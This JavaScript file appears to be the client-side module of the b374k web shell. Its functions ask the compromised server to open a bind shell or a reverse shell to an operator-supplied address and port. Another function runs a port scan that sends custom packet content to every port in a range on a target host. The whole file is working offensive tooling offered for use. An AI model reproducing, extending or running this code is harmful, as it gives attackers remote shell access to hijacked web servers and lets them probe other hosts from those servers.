Zepto(function($){
	rs_init();

});

function rs_init(){
	if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){
		var splits = evalSupported.split(",");
		$.each(splits, function(i, k){
			$('.rsType').append("<option>"+k+"</option>");
		});
	}
	else setTimeout('rs_init()', 1000);

	$('#packetContent').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			packet_go();
		}
		fix_tabchar(this, e);
	});
}

function rs_go_bind(){
	rs_go('bind');
}
function rs_go_back(){
	rs_go('back');
}

function rs_go(rsType){
	var rsArgs = "";
	var rsPort,rsLang,rsResult;
	if(rsType=='bind'){
		rsPort = parseInt($('#bindPort').val());
		rsLang = $('#bindLang').val();
		rsArgs = rsPort;
		rsResult = $('#bindResult');
	}
	else if(rsType=='back'){
		var rsAddr = $('#backAddr').val();
		rsPort = parseInt($('#backPort').val());
		rsLang = $('#backLang').val();
		rsArgs = rsPort + ' ' + rsAddr;
		rsResult = $('#backResult');
	}

	if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){
		rsResult.html('Invalid port');
		return;
	}

	if(rsArgs!=''){
		send_post({ rsLang:rsLang, rsArgs:rsArgs },
			function(res){
				if(res!='error'){
					var splits = res.split('{[|b374k|]}');
					if(splits.length==2){
						output = splits[0]+"<hr>"+splits[1];
						rsResult.html(output);
					}
					else{
						rsResult.html(res);
					}
				}
			}
		);
	}
}

function packet_go(){
	var packetHost = $('#packetHost').val();
    var packetStartPort = parseInt($('#packetStartPort').val());
    var packetEndPort = parseInt($('#packetEndPort').val());
    var packetTimeout = parseInt($('#packetTimeout').val());
    var packetSTimeout = parseInt($('#packetSTimeout').val());
    var packetContent = $('#packetContent').val();
    var packetResult = $('#packetResult');
    var packetFailResult = $('#packetFailResult');
    // var packetStatus = $('#packetStatus');
    var packetPortList = $('#packetPortList').val();

	if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){
		packetResult.html('Invalid start port');
		return;
	}
	if((isNaN(packetEndPort))||(packetEndPort<=0)||(packetEndPort>65535)){
		packetResult.html('Invalid end port');
		return;
	}
	
	if((isNaN(packetTimeout))||(packetTimeout<=0)){
		packetResult.html('Invalid connection timeout');
		return;
	}
	if((isNaN(packetSTimeout))||(packetSTimeout<=0)){
		packetResult.html('Invalid stream timeout');
		return;
	}

	var start,end;
	if(packetStartPort>packetEndPort){
		start = packetEndPort;
		end = packetStartPort;
	}else{
		start = packetStartPort;
		end = packetEndPort;
	}

	var i;
	var ports = [];
	if(packetPortList.length > 0) {
		packetPortList = packetPortList.split('|');
		for(i = 0; i < packetPortList.length; i++) {
            var port = parseInt(packetPortList[i]);
            if(!isNaN(port) && ports.indexOf(port) === -1) {
                ports.push(port);
            }
        }
	}

	for (i = start; i <= end; i++) {
        if(ports.indexOf(i) === -1) {
            ports.push(i);
        }
	}

	packetResult.html('');
    ports.sort(function (a, b) { return a-b; });
    ports.forEach(function (packetPort) {
        send_post({packetHost:packetHost, packetPort:packetPort, packetTimeout:packetTimeout, packetSTimeout:packetSTimeout, packetContent:packetContent}, function (res) {
            if (res.startsWith('false|')) {
                var msg = res.substring(6);
                packetFailResult.append("<p style='color: red;'>" + msg + "</p>");
            } else {
                packetResult.append(res);
            }
        }, false);
    });
}